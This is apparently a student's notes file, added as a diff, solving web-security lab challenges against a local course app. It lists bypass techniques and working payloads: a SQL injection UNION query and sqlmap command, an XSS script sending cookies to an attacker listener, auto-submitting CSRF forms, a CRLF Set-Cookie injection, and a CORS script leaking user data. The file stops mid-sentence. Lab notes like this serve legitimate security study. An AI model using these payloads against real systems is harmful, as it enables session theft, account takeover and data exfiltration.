@@ -1,0 +1,118 @@
+It has payloads for all kinds of attacks
+git clone git@github.com:swisskyrepo/PayloadsAllTheThings.git
+
+Labs and more material
+git clone git@github.com:siddhantm27/websec-help.git
+
+
+Information disclosure via comments:
+The flags are present in any of the files. They are not visible on the website as they are commented out. So check the html files, javascript and css files. Search in those files to find the flags
+
+Information Disclosure via error/debug messages:
+Some parameters in the urls take only integers or strings like that. So if the type does not match, or the thing that you filled in the parameter does not exist, then it can give out an error. In that error, there can be flags. Also it might give you various endpoints that are not publicly listed. Check those urls. It can somehow also have the password of the admin
+
+Information Disclosure via Backup files:
+link to the backup files can be found through robots.txt or robot.txt
+That will give you a list of places which can be checked for to find interesting places which can be accessible
+To know which can be accessible, use zap fuzzer
+some of the files can even reveal passwords
+
+Basic SSRF against local server:
+Find the action that leads to the client sending the url in the payload of a request. So here, there is a proxy which forwards the requests to the server and if the request originates from the proxy, then the server will perform the action. Otherwise it won't. So that is why you can't directly access the website /v1/admin. You have to somehow make the proxy send that request for you.
+There is a fetch syllabus button which sends a parameter called url to the proxy. The proxy directly does a fetch on that url and as the url originated from the proxy, the server responds to it. So if you change the original url and proxy fetches it for you, then the server will work on it
+
+Some of the urls can be blacklisted. But there is a list of things that you can try against it
+If localhost is blacklisted, then you can try these instead:
+check the payloads repository server side request forgery
+Also some keywords can be blacklisted. These can still be accessed by html encoding some letter in the keywork 3 times
+
+The blacklist and whitelist are implemented by the proxy. So proxy can still access those links but it will just match them first and check if they are vlaid
+
+http://api.bodhitree.com:30000/v1/syllabus/../admin/delete?userid=23204
+
+This was the whitelist. You go to syllabus and then back. The whitelist was just checking if the prefix matches or not. But it did not handle directory traversal
+
+File upload vulnerabilities:
+Look at the id.php file. Also there are a lot of files in `upload insecure files` folder of the payloads repository
+
+Blacklisted extensions for file upload:
+Look at the extensions given in the readme of `upload insecure files` folder
+
+Whitelisted file extension and file check:
+GIF87a or GIF89a is the ascii starting for gif files
+JPEG start with bytes FF D8 FF
+Also look at the .htaccess to allow php files with different extensions to execute
+
+Path traversal:
+If path traversal is allowed, then do ../ a lot of times (at least 7-8)
+If it is not allowed, then do url encoding (multiple times (can try unicode too)) 
+Also null byte if the extension is being checked
+
+Password bruteforce with IP blocking mechanism in place:
+X-Forwarded-For header has the IP form which the request originated. The proxies can add this field. But the client can too. So in case the IP is being blocked after a few tries, then change the IP in this field. Using ZAP, you can use 10.10.*.* as the IP and the passwords from the list of passwords. Look at the exploit.py code
+
+Username Enumeration with defense in the form of account blocking:
+This did not have IP blocking. The valid username was admin_[a-z]{2}. Just use zap fuzzer. 
+
+Broken 2FA logic and Bruteforcing 2FA:
+Needed to edit two requests. One for generating the otp. Second for guessing the otp. The broken logic was that the password was not being checked when otp was given. And that the OTP generate request was sent by the client side logic itself. So you have access to the request and therefore just tell it to generate request for admin
+
+Another privilege escalation based on User role:
+Rajesh couldn't change the marks of some other course because he was not in the course as a TA or a student
+But Laksh is. So get the request that Rajesh uses to change the marks. Then using Laksh's session id, change the payload for the person you want to change and put the role as ta or admin
+
+SQLi:
+Laksh' UNION SELECT sno, CONCAT(username, password), NULL, NULL FROM users -- 
+
+sqlmap -u 'http://localhost:30000/participants.php?courseid=5' --cookie='PHPSESSID=gt0545tjn9l3dp4hakkuj1kmov' --search -T users --batch
+
+XSS:
+<script>var i=new Image(); i.src="http://0.0.0.0:30001/?cookie="+document.cookie;</script>
+
+Simple CSRF with no defensive mechanism:
+<form method="post" action="http://localhost:30000/updateEmail/">
+        <input type="text" id="new_email" name="new_email" placeholder="hello@123.com" value="hacked@gmail.com" class="w3-input w3-border" required="">
+        <button type="submit" class="w3-button w3-blue w3-margin-top">Submit</button>
+        </form>
+<script>
+document.forms[0].submit();
+</script>
+
+CSRF Attack with improper CSRF token implementation ( token not tied to user-session):
+<form method="post" action="http://localhost:30000/updateEmail/">
+        <input type="text" id="new_email" name="new_email" placeholder="hello@123.com" value="hacked@gmail.com" class="w3-input w3-border" required="">
+<input type="hidden" value="d8606aa17ea02151256dc4ca643c65ee3ba96d7d2d05dc633599fa814193cf9e" readonly="" name="csrftoken" required="">
+        <button type="submit" class="w3-button w3-blue w3-margin-top">Submit</button>
+        </form>
+<script>
+document.forms[0].submit();
+</script>
+
+CSRF Attack with improper CSRF token implementation (CSRF token is paired with a cookie):
+<img src="http://localhost:30000/participants/?courseid=4&search=/%0d%0aSet-Cookie:csrftoken=hacked">
+
+<form method="post" action="http://localhost:30000/updateEmail/">
+        <input type="hidden" value="hacked" readonly="" name="csrftoken" required="">
+        <label for="new_email">Update Email:</label>
+        <input type="text" id="new_email" name="new_email" value="hacked@gmail.com" placeholder="laksh@bodhitree.com" class="w3-input w3-border" required="">
+        <button type="submit" class="w3-button w3-blue w3-margin-top">Submit</button>
+        </form>
+
+<script>
+document.forms[0].submit();
+</script>
+
+CORS: Basic Origin Reflection:
+<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','http://localhost:30000/userData/',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+    location='/log?key='+this.responseText;
+};
+</script>
+
+Almost the same thing but in 
